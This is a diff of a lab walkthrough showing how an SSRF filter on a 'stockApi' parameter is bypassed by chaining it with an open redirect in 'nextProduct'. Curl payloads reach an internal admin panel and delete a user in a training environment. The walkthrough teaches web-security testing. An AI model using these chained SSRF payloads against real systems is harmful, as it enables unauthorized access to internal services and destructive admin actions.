@@ -13,29 +13,66 @@ The application has a stock check feature that loads data from an internal syste
 First let's explore the lab and identify the stock check feature
 
 ```bash
-curl -s "https://0a5c008e0345538c8358963400c600ae.web-security-academy.net/" | bat
+curl -s "https://<lab-url>.web-security-academy.net/" | cat
 ```
 
-The main page is displayed here
+> **Command breakdown**: \
+`-s` = silent mode (no progress meter) \
+`| cat` = pipe response output to my [customized cat command](https://github.com/echoesofwhoami/echoes-bat-theme) for stylish display
+
+The main page is displayed on the root path, let's explore it
 
 ![Home page](../screenshots/ssrf-filter-bypass-open-redirection/01_home_page.png)
 
 In the main page html we can find the product detail link
-
-![Product detail](../screenshots/ssrf-filter-bypass-open-redirection/02_product_detail.png)
-
+```html
+<SNIP>...<SNIP>
+      <a class="button" href="/product?productId=1">View details</a>
+  </div>
+<SNIP>...<SNIP>
+```
 Lets curl it and see the response.
 
-![Product detail page](../screenshots/ssrf-filter-bypass-open-redirection/03_product_detail_page.png)
+```bash
+curl -s "https://<lab-url>.web-security-academy.net/product?productId=1" | cat
+```
+
+The product detail page contains the following key elements:
+
+```html
+<SNIP>...<SNIP>
+
+  <form id="stockCheckForm" action="/product/stock" method="POST">
+      <select name="stockApi">
+          <option value="/product/stock/check?productId=1&storeId=1">London</option>
+          <option value="/product/stock/check?productId=1&storeId=2">Paris</option>
+          <option value="/product/stock/check?productId=1&storeId=3">Milan</option>
+      </select>
+      <button type="submit" class="button">Check stock</button>
+  </form>
+  <span id="stockCheckResult"></span>
+  <script src="/resources/js/stockCheckPayload.js"></script>
+  <script src="/resources/js/stockCheck.js"></script>
+  <div class="is-linkback">
+      <a href="/">Return to list</a>
+      <a href="/product/nextProduct?currentProductId=1&path=/product?productId=2">| Next product</a>
+  </div>
+
+<SNIP>...<SNIP>
+```
 
 There are a couple of interesting things here:
 
-1. The javascript code that is executed when the page is loaded
+1. Some javascript code that provides the client-side behavior of this page
 2. The path parameter on this link: ```<a href="/product/nextProduct?currentProductId=1&path=/product?productId=2">| Next product</a>```
 
 Lets explore the javascript code to understand the client-side behavior of this page:
 
-This code is adding an event listener to the form that we've seen in the previous screenshot (with the id "stockCheckForm") to the submit event, this event will call the function "stockCheck" with the method "POST", the action "product/stock" and the form data as a parameter, the first javascript snippet will mostly turn the payload into a x-www-form-urlencoded string and provide the application/x-www-form-urlencoded header to the request.
+```bash
+curl -s "https://<lab-url>.web-security-academy.net/resources/js/stockCheckPayload.js" | cat
+```
+
+Response:
 
 ```javascript
 # stockCheckPayload.js
@@ -44,7 +81,17 @@ window.contentType = 'application/x-www-form-urlencoded';
 function payload(data) {
     return new URLSearchParams(data).toString();
 }
+```
 
+This first JavaScript snippet sets up the content type header and provides a utility function to convert form data into URL-encoded format for the HTTP request.
+
+```bash
+curl -s "https://<lab-url>.web-security-academy.net/resources/js/stockCheck.js" | cat
+```
+
+Response:
+
+```javascript
 # stockCheck.js
 document.getElementById("stockCheckForm").addEventListener("submit", function(e) {
     checkStock(this.getAttribute("method"), this.getAttribute("action"), new FormData(this));
@@ -73,31 +120,74 @@ function checkStock(method, path, data) {
 }
 ```
 
-Now let's explore the application behavior more deeply. First, let's examine the stock check form more carefully:
+This last script is adding an event listener to the submit event of the html form that we've seen earlier (with the id "stockCheckForm"), triggering this event will call the function "checkStock" with the method "POST", the action "product/stock" and the form data as parameters ```checkStock(method, path, data)``` and use the payload function to convert the form data into a x-www-form-urlencoded string as a body for the HTTP request as well as setting the content type header to application/x-www-form-urlencoded.
+
+Let's explore the application behavior more deeply. First, let's emulate the javascript request to check the stock of a product:
 
 ```bash
-curl -s "https://0a5c008e0345538c8358963400c600ae.web-security-academy.net/product/stock" \
+curl -s "https://<lab-url>.web-security-academy.net/product/stock" \
   -H "Content-Type: application/x-www-form-urlencoded" \
-  -d "stockApi=/product/stock/check?productId=1&storeId=1"
+  -d "stockApi=/product/stock/check?productId=1&storeId=1" | cat
 ```
 
-This works as expected and returns stock information. Now let's try to exploit the SSRF vulnerability directly by attempting to access the internal admin interface:
+> **Command breakdown**: \
+`-H "Content-Type: application/x-www-form-urlencoded"` = set content type header to application/x-www-form-urlencoded to emulate the javascript request \
+`-d "stockApi=/product/stock/check?productId=1&storeId=1"` = set the body of the request to the form data, this will automatically set the http method to POST \
+
+This returns:
+
+```Response: "Missing parameter"```
+
+and made me realize that this endpoint is calling to another one internally and ```&storeId=1``` is not getting added as a parameter to the second request but being parsed in the first one so thats why we get "Missing parameter".
+
+I'll validate my suspicions by sending a GET request directly to ```/product/stock/check?productId=1&storeId=1```
 
 ```bash
-curl -s "https://0a5c008e0345538c8358963400c600ae.web-security-academy.net/product/stock" \
-  -H "Content-Type: application/x-www-form-urlencoded" \
-  -d "stockApi=http://192.168.0.12:8080/admin"
+curl -s "https://<lab-url>.web-security-academy.net/product/stock/check?productId=1&storeId=1" | cat
 ```
 
-Response: `"Invalid external stock check url 'Invalid URL'"`
+```Response: "414 units"```
 
-As expected, the SSRF is blocked. The application has a filter that validates the `stockApi` parameter and prevents direct access to external URLs, particularly internal network addresses.
+Now to be absoutely sure about it I will reproduce the same error by not sending the parameter storeId
+
+```bash
+curl -s "https://<lab-url>.web-security-academy.net/product/stock/check?productId=1" | cat
+```
+
+```Response: "Missing parameter"```
+
+So to make it work we have to encode the amperstamp on the first request
+
+```bash
+curl -s "https://<lab-url>.web-security-academy.net/product/stock" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "stockApi=/product/stock/check?productId=1%26storeId=1" | cat
+```
+
+```Response: "414 units"```
+
+This confirms a SSRF vector, the request is being called from the stockApi parameter.
+
+Now let's try to exploit the SSRF vulnerability directly by attempting to access the internal admin interface:
+
+```bash
+curl -s "https://<lab-url>.web-security-academy.net/product/stock" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "stockApi=http://192.168.0.12:8080/admin" | cat
+```
+
+```Response: `"Invalid external stock check url 'Invalid URL'"```
+
+As expected by the name of this lab, the SSRF is blocked. The application has a filter that validates the `stockApi` parameter and prevents direct access to external URLs, particularly internal network addresses.
 
 Now let's test the open redirection vulnerability we found in the `path` parameter:
 
 ```bash
-curl -s "https://0a5c008e0345538c8358963400c600ae.web-security-academy.net/product/nextProduct?currentProductId=1&path=http://portswigger.net" -v
+curl -s "https://<lab-url>.web-security-academy.net/product/nextProduct?currentProductId=1&path=http://portswigger.net" -v
 ```
+
+> **Command breakdown**: \
+`-v` = verbose mode, this will show the response headers
 
 Response: `HTTP/2 302` with `location: http://portswigger.net`
 
@@ -129,12 +219,12 @@ We need to chain these vulnerabilities:
 
 Let's craft our exploit:
 
-**Note**: In this lab, the target IP `192.168.0.12:8080` and admin panel location are provided in the lab description. In a real-world scenario, you would need to discover this information through network enumeration, port scanning, and path discovery techniques.
+**Note**: In this lab, the target IP `192.168.0.12:8080` and admin panel location are provided in the lab description. In a real-world scenario, you would need to discover this information through internal network enumeration, port scanning, and path discovery techniques.
 
 ```bash
-curl -s "https://0a5c008e0345538c8358963400c600ae.web-security-academy.net/product/stock" \
+curl -s "https://<lab-url>.web-security-academy.net/product/stock" \
   -H "Content-Type: application/x-www-form-urlencoded" \
-  -d "stockApi=/product/nextProduct?currentProductId=1%26path=http://192.168.0.12:8080/admin"
+  -d "stockApi=/product/nextProduct?currentProductId=1%26path=http://192.168.0.12:8080/admin" | cat
 ```
 
 This works because:
@@ -143,8 +233,6 @@ This works because:
 3. The `nextProduct` endpoint redirects to `http://192.168.0.12:8080/admin`
 4. The stock check follows the redirect and accesses the internal admin interface
 
-**Important note about URL encoding**: The `&` character needs to be URL-encoded as `%26` because we're embedding a complete URL with query parameters inside another URL's query parameter. If we used `&` directly, it would be interpreted as a separator for the outer URL's query parameters, not as part of the inner `path` parameter. The server would see `currentProductId=1` and `path=http://192.168.0.12:8080/admin` as separate parameters, which is not what we want. By URL-encoding it as `%26`, we ensure the entire string `currentProductId=1&path=http://192.168.0.12:8080/admin` is treated as a single value for the `stockApi` parameter.
-
 Response:
 
 ![Product detail page](../screenshots/ssrf-filter-bypass-open-redirection/05_admin_panel.png)
@@ -152,9 +240,9 @@ Response:
 With access to the admin panel, we can delete the user carlos:
 
 ```bash
-curl -s "https://0a5c008e0345538c8358963400c600ae.web-security-academy.net/product/stock" \
+curl -s "https://<lab-url>.web-security-academy.net/product/stock" \
   -H "Content-Type: application/x-www-form-urlencoded" \
-  -d "stockApi=/product/nextProduct?currentProductId=1%26path=http://192.168.0.12:8080/admin/delete?username=carlos"
+  -d "stockApi=/product/nextProduct?currentProductId=1%26path=http://192.168.0.12:8080/admin/delete?username=carlos" | cat
 ```
 
 Response:
